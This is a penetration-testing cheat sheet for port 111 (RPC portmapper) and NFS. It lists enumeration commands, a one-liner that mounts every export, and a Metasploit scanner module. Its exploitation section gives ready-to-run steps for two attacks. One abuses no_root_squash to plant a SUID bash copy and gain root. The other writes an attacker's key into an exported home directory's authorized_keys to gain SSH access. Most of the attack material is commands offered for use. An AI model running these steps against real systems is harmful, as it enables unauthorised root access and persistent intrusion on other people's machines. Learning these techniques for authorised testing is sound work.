# Port 111 - RPC (Portmapper)

## Table of Contents

- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [RPC Enumeration](#rpc-enumeration)
- [NFS Discovery](#nfs-discovery)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
# RPC + NFS enumeration
rpcinfo -p $rhost && showmount -e $rhost 2>/dev/null

# Nmap all RPC/NFS scripts
nmap -p 111,2049 --script "rpcinfo,nfs-*" -sV $rhost
```

### Mount NFS (One-liner)

```shell
# Auto-mount all exports
for share in $(showmount -e $rhost 2>/dev/null | tail -n+2 | awk '{print $1}'); do mkdir -p /tmp/nfs$share && sudo mount -t nfs -o nolock $rhost:$share /tmp/nfs$share && echo "[+] Mounted $share"; done
```

---

## NFS Discovery

> RPC portmapper often reveals NFS services

```shell
# Show NFS exports
showmount -e $rhost

# Show all mounts
showmount -a $rhost

# Nmap NFS scripts
nmap -p 111,2049 --script "nfs-ls,nfs-showmount,nfs-statfs" $rhost
```

### Mount NFS Share

```shell
# Create mount point
mkdir /tmp/nfs

# Mount share
mount -t nfs $rhost:/share /tmp/nfs

# Mount with options
mount -t nfs -o vers=2 $rhost:/share /tmp/nfs
mount -t nfs -o vers=3 $rhost:/share /tmp/nfs
mount -t nfs -o nolock $rhost:/share /tmp/nfs

# Unmount
umount /tmp/nfs
```

---

## Exploitation

### NFS Root Squash Bypass

> If no_root_squash is enabled, root on client = root on server

```shell
# Check NFS options
cat /etc/exports

# Look for no_root_squash
# /share *(rw,no_root_squash)
```

### SUID Binary Exploitation

```shell
# Create malicious binary on attacker
cp /bin/bash /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# On target (as low-priv user)
/share/shell -p
```

### SSH Key Injection

```shell
# If /home/user is exported
mkdir /tmp/nfs/.ssh
echo "ssh-rsa AAAA..." > /tmp/nfs/.ssh/authorized_keys
chmod 700 /tmp/nfs/.ssh
chmod 600 /tmp/nfs/.ssh/authorized_keys

# Connect via SSH
ssh user@$rhost
```

---

## Common RPC Services

| Program | Description |
| --- | --- |
| portmapper (100000) | RPC port mapper |
| nfs (100003) | Network File System |
| mountd (100005) | NFS mount daemon |
| nlockmgr (100021) | NFS lock manager |
| status (100024) | NFS status monitor |
| ypserv (100004) | NIS server |
| ypbind (100007) | NIS binder |
| rquotad (100011) | Quota daemon |

---

## Metasploit Modules

```shell
# NFS mount scanner
use auxiliary/scanner/nfs/nfsmount

# Show mounts
set RHOSTS $rhost
run
```
